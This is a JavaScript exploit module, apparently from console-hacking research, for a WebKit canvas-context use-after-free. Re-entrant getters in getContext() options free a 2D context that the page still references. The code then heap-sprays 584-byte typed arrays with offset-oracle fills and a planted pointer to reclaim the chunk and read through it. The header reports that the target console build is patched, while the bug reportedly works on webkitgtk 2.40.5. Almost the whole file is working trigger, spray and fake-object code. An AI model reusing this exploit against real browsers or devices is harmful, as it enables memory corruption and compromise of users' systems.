// uaf584: the #15 canvas-context UAF, on the console instead of the host
// harness. The host page (poc/uaf-spray.html) proves the class on webkitgtk
// 2.40.5; this experiment is the same trigger so the console can answer two
// questions the host cannot:
//
//   1. does the WKC build free a 2D context the page still holds a wrapper
//      for, and does a 584-byte Uint8Array reclaim it? (crash / behaviour)
//   2. if `sbuf` is supplied, does a read at that address come back as data?
//      That is how a non-randomised peer heap would be detected -- the page
//      needs one address it did not have to leak.
//
// Both answers are in, and the console says no to the premise: the shipped
// engine re-checks m_context after the options conversion, so the outer
// getContext() returns the context the getter installed instead of allocating
// a replacement, and nothing is freed (docs/V19-BRANCH.md 9.9, runs 857-864).
// The probes stay because they are the cheapest way to tell a guarded engine
// from a vulnerable one: op=outerAttrs with desync=true reports the inner
// context's attributes on a guarded build and the outer settings on a
// vulnerable one, and the no-reentry control proves the read path works.
//
// Nothing between the free and the use may allocate or log: a console message
// builds a Vector<ScriptCallFrame> (584 bytes) inside the same heap and wins
// the chunk ahead of the spray. Results are returned from run() and leave the
// page through the normal report path, after the use.
//
// The offset oracle from the host page is kept: fill=offset writes
// 0x4141414100004141 + (off << 16) + (off >> 3) into every qword, so a fault
// address names the field that was read without a debugger.
//
// Queue with:
//   sudo node tools/experiment.mjs enqueue uaf584 --label uaf584-1
(function () {
  'use strict';
  if (typeof Ns2Webkit === 'undefined' || !Ns2Webkit.registerExperiment)
    throw new Error('uaf584: Ns2Webkit.registerExperiment is missing');

  // The geometry the host harness measured: sizeof(CanvasRenderingContext2D)
  // is 584, State is 456, and &state = *(void **)(obj + 72) + (m_size - 1) * 456.
  var DEFAULT_SIZE = 584;
  var SOURCE_CANVAS = 8;

  function hex(value) {
    return '0x' + BigInt(value).toString(16);
  }

  function parseSet(raw) {
    // Accepts { "72": "0x7f00...", "84": 1 } from experimentArgs.
    var out = [];
    if (!raw || typeof raw !== 'object') return out;
    for (var key in raw) {
      if (!Object.prototype.hasOwnProperty.call(raw, key)) continue;
      var off = Number(key);
      if (!isFinite(off) || off < 0 || off % 8 !== 0 || off >= 4096) continue;
      var value;
      try {
        value = BigInt(raw[key]);
      } catch (error) {
        continue;
      }
      out.push([off, value]);
    }
    return out;
  }

  Ns2Webkit.registerExperiment({
    name: 'uaf584',
    description: 'canvas-context UAF: free, 584-byte reclaim, controlled read',
    run: function (params, api) {
      var args = (params && params.experimentArgs) || {};
      var size = Number(args.size);
      if (!isFinite(size) || size <= 0) size = DEFAULT_SIZE;
      // Only the measured geometry is meaningful here; a different size would
      // reclaim a different object and report a misleading "no stale object".
      size = DEFAULT_SIZE;
      var count = Number(args.n);
      if (!isFinite(count) || count <= 0) count = 64;
      count = Math.min(count, 512);
      var fill = typeof args.fill === 'string' ? args.fill : 'marker';
      var op = typeof args.op === 'string' ? args.op : 'lineWidthGet';
      var markState = !!args.markState;
      var order = !!args.order;
      // What the desynchronized getter returns. CanvasRenderingContext2DSettings
      // copies it into m_settings, so asking for true and reading the context's
      // attributes afterwards says whether that settings object reached a
      // context the page can see.
      var desync = !!args.desync;
      // Control for the same probe: the getter returns desync without calling
      // back into getContext, so the outer call takes the ordinary path and
      // really does build its context from this settings object.
      var noreenter = !!args.noreenter;
      var ticks = Number(args.ticks);
      if (!isFinite(ticks) || ticks < 0) ticks = 0;

      var set = parseSet(args.set);
      if (typeof args.sbuf === 'string' && args.sbuf) {
        var sbuf;
        try {
          sbuf = BigInt(args.sbuf);
        } catch (error) {
          sbuf = null;
        }
        if (sbuf !== null) {
          // ?sbuf shorthand: m_buffer, m_capacity 1, m_size 1, no pending saves.
          set = [[72, sbuf], [80, 1n], [84, 1n], [560, 0n]].concat(set);
        }
      }

      var canvas = document.createElement('canvas');
      canvas.width = 64;
      canvas.height = 64;
      var source = document.createElement('canvas');
      source.width = SOURCE_CANVAS;
      source.height = SOURCE_CANVAS;

      var stale = null;
      var outer = null;
      var reentered = false;
      function reenter() {
        if (reentered) return;
        reentered = true;
        stale = canvas.getContext('2d');
        if (markState && stale) {
          // Written before the outer call returns, so it is A's state and
          // cannot exist on a replacement context. Reading it back later says
          // whether the wrapper still addresses A's bytes.
          stale.lineWidth = 7.25;
          stale.fillStyle = '#123456';
        }
      }

      // The inner getContext caches the context; the outer one then finishes
      // and drops the wrapper the page kept. Any one of these attributes is
      // enough; all four are declared so a build that skips one still re-enters.
      function trigger() {
        outer = canvas.getContext('2d', {
          get desynchronized() { if (!noreenter) reenter(); return desync; },
          get willReadFrequently() { reenter(); return false; },
          get alpha() { reenter(); return true; },
          get colorSpace() { reenter(); return 'srgb'; }
        });
      }

      var spray = [];
      function sprayNow() {
        for (var i = 0; i < count; ++i) {
          var buffer = new Uint8Array(size);
          if (fill === 'marker') {
            var dv = new DataView(buffer.buffer);
            for (var off = 0; off + 8 <= size; off += 8) {
              dv.setBigUint64(off,
                0x4141414100000000n + (BigInt(i) << 8n) + BigInt(off >> 3), true);
            }
          } else if (fill === 'ones') {
            buffer.fill(0x41);
          } else if (fill === 'vt') {
            buffer.fill(0);
            new DataView(buffer.buffer).setBigUint64(0, 0x4141414100004141n, true);
          } else if (fill === 'offset') {
            var db = new DataView(buffer.buffer);
            for (var o = 0; o + 8 <= size; o += 8) {
              db.setBigUint64(o,
                0x4141414100004141n + (BigInt(o) << 16n) + BigInt(o >> 3), true);
            }
          } // 'zero' is the default state of a fresh Uint8Array
          if (set.length) {
            var sv = new DataView(buffer.buffer);
            for (var k = 0; k < set.length; ++k) sv.setBigUint64(set[k][0], set[k][1], true);
          }
          spray.push(buffer);
        }
      }

      function readBits(value) {
        try {
          return hex(api.bits(value));
        } catch (error) {
          return 'bits-throw';
        }
      }

      function use() {
        var out = 'no-op';
        if (op === 'none') return out;
        // The no-reentry control has no inner context, and its whole point is
        // to read the outer one, so it must not take the early return.
        if (!stale && op !== 'outerAttrs') return out;
        try {
          switch (op) {
            case 'canvas': out = 'width=' + stale.canvas.width; break;
            case 'canvasElementRead': out = 'tag=' + stale.canvas.tagName; break;
            case 'fillRect': stale.fillRect(0, 0, 1, 1); out = 'ok'; break;
            case 'lineWidthGet': out = 'lw=' + readBits(stale.lineWidth); break;
            case 'lineWidthRW':
              stale.lineWidth = 3.25;
              out = 'wrote then read ' + readBits(stale.lineWidth);
              break;
            case 'globalAlphaGet': out = 'ga=' + readBits(stale.globalAlpha); break;
            case 'miterLimitGet': out = 'ml=' + readBits(stale.miterLimit); break;
            case 'lineDashOffsetGet': out = 'ldo=' + readBits(stale.lineDashOffset); break;
            case 'textAlignRW':
              stale.textAlign = 'center';
              out = 'wrote then read ' + stale.textAlign;
              break;
            case 'directionRW':
              stale.direction = 'rtl';
              out = 'wrote then read ' + stale.direction;
              break;
            case 'textBaselineRW':
              stale.textBaseline = 'middle';
              out = 'wrote then read ' + stale.textBaseline;
              break;
            case 'save': stale.save(); out = 'ok'; break;
            case 'restore': stale.restore(); out = 'ok'; break;
            case 'stateProbe':
              out = 'lw=' + stale.lineWidth + ' fs=' + stale.fillStyle;
              break;
            case 'outerAttrs': {
              // Discriminator: the outer getContext ran with desync=true. If it
              // reached createContext2d, the context the page now holds was
              // built from that settings object and reports desynchronized
              // true; if it returned the inner context from the entry check,
              // that one was built from an empty dictionary and reports false.
              var o = outer ? JSON.stringify(outer.getContextAttributes()) : 'null';
              var i = stale ? JSON.stringify(stale.getContextAttributes()) : 'null';
              out = 'outer=' + o + ' stale=' + i;
              break;
            }
            case 'getContextAttributes':
              out = 'attrs=' + JSON.stringify(stale.getContextAttributes());
              break;
            case 'getLineDash': out = 'ld=' + stale.getLineDash().length; break;
            case 'measureText': out = 'w=' + stale.measureText('x').width; break;
            case 'getImageData': out = 'px=' + stale.getImageData(0, 0, 1, 1).data.length; break;
            default: out = 'unknown op ' + op; break;
          }
        } catch (error) {
          out = 'threw ' + error;
        }
        return out;
      }

      var report = {
        size: size,
        n: count,
        fill: fill,
        op: op,
        set: set.length,
        stale: false,
        // The host control (poc/uaf-identity.html) measured outerSame=false:
        // the outer getContext returns a *different* wrapper and drops the one
        // the page kept. false here means the console took the same branch, so
        // the 584-byte chunk the page holds a wrapper for is the freed one.
        outerSame: null,
        cachedSame: null,
        // getContextAttributes() returns m_settings by value: two fields at
        // the tail of the object, so it reads no pointer and cannot fault on
        // a reclaimed chunk. With fill=marker the first byte of m_settings is
        // 0x48, i.e. desynchronized:true -- a reclaim signal that survives the
        // report path.
        attrsBefore: null,
        attrsAfter: null,
        stateBefore: null,
        stateAfter: null,
        // Conversion-site probe (args.order). With a live context already on
        // the canvas, getContext() returns it from the entry check before any
        // dictionary conversion runs, so a getter that fires here proves the
        // options object was converted in the bindings layer, ahead of the
        // C++ call. That would put the re-entrant call strictly before the
        // entry check, and there would be no window for this trigger at all.
        fired: null,
        desync: desync,
        out: 'not-run',
        spraySample: null
      };

      if (order) {
        var first = canvas.getContext('2d');
        var fired = 0;
        var result = null;
        if (first) {
          result = canvas.getContext('2d', {
            get desynchronized() { ++fired; return false; },
            get willReadFrequently() { ++fired; return false; },
            get alpha() { ++fired; return true; },
            get colorSpace() { ++fired; return 'srgb'; }
          });
        }
        report.fired = fired;
        report.stale = !!first;
        report.outerSame = !!(first && result === first);
        report.out = 'first=' + (first ? 'ctx' : 'null') + ' fired=' + fired
          + ' same=' + report.outerSame;
        return report;
      }

      // Same task as the free, unless ticks was asked for (that variant is the
      // host's deferred-spray control, not the reclaim path).
      trigger();
      report.stale = !!stale;
      report.outerSame = (outer === stale);
      if (stale) {
        // A cached context makes this a lookup, not an allocation, so it is
        // safe between the free and the spray.
        var cached = canvas.getContext('2d');
        report.cachedSame = (cached === stale);
        // Only with no spray queued: the dictionary object and the fillStyle
        // string are allocations, and any allocation here competes with the
        // spray for the freed chunk.
        if (count === 0) {
          report.attrsBefore = JSON.stringify(stale.getContextAttributes());
          if (markState) report.stateBefore = 'lw=' + stale.lineWidth + ' fs=' + stale.fillStyle;
        }
      }
      if (op !== 'outerAttrs') sprayNow();
      if (set.length && spray.length) {
        var check = new DataView(spray[spray.length - 1].buffer);
        report.spraySample = {
          q16: hex(check.getBigUint64(16, true)),
          q24: hex(check.getBigUint64(24, true)),
          q72: hex(check.getBigUint64(72, true)),
          q84: hex(check.getBigUint64(84, true))
        };
      }

      if (ticks > 0) {
        // Deferred use: returns a promise so the sweep still sees a value.
        return new Promise(function (resolve) {
          var left = ticks;
          (function tick() {
            if (--left > 0) { setTimeout(tick, 0); return; }
            report.out = use();
      if (stale && op !== 'none') {
        try {
          report.attrsAfter = JSON.stringify(stale.getContextAttributes());
          if (markState) report.stateAfter = 'lw=' + stale.lineWidth + ' fs=' + stale.fillStyle;
        } catch (error) {
          report.attrsAfter = 'threw ' + error;
        }
      }
            resolve(report);
          })();
        });
      }

      report.out = use();
      if (stale && op !== 'none') {
        try {
          report.attrsAfter = JSON.stringify(stale.getContextAttributes());
          if (markState) report.stateAfter = 'lw=' + stale.lineWidth + ' fs=' + stale.fillStyle;
        } catch (error) {
          report.attrsAfter = 'threw ' + error;
        }
      }
      return report;
    }
  });
})();
